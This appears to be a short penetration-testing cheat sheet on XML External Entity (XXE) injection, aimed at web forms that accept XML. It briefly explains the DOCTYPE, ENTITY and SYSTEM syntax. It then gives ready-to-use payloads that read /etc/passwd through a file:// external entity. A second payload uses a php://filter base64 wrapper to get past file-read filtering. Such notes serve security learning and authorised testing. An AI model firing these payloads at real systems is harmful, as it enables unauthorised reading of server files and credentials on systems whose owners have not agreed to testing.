# XXE Payloads

When you notice XML in the website or through the HTTP headers, we should see if we can get some XXE.

### Example, Basic File Read

IF you are able to change the XML code in the POST, we might be able to leverage an XXE vulnerability. Lets look at a simple XML code block like this.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>we</title>
                <cwe>we</cwe>
                <cvss>we</cvss>
                <reward>we</reward>
                </bugreport>                                                                                        
```

For a file read injection we can add some code to the code block. But first we need to understand some basic syntax. `!DOCTYPE` - declares a set of rules about what can appear in the xml. `!ENTITY` - is similar to defining a variable that you can call on later in the file. `SYSTEM` - tells the XML parser to retrieve the entity from an external source allowing for XXE. Lastly, we can input the variable we defined earlier with `!ENTITY` to a textfield. It would look something like this. `<text>&variable;<\text>`. Using this knowledge we can change our XML code block to look something like this.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
 <cwe>test</cwe>
 <cvss>test</cvss>
 <reward>&file;</reward>
</bugreport>
```

This will attempt to read the `/etc/passwd` file AS the webserver and output the contents of the file where `<reward>` should go.

### Base64 Encoded File Read

Sometimes, we will need to grab the base64 encoded output of a file if file reads are filtered (which they commonly are). To do this, we can utilize the simple php command `php://filter/read=convert.base64-encode/resource=/etc/passwd`

```xml
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>
<any>
<title>test</title>
  <textoutput>&file;</textoutput>
</any>
```
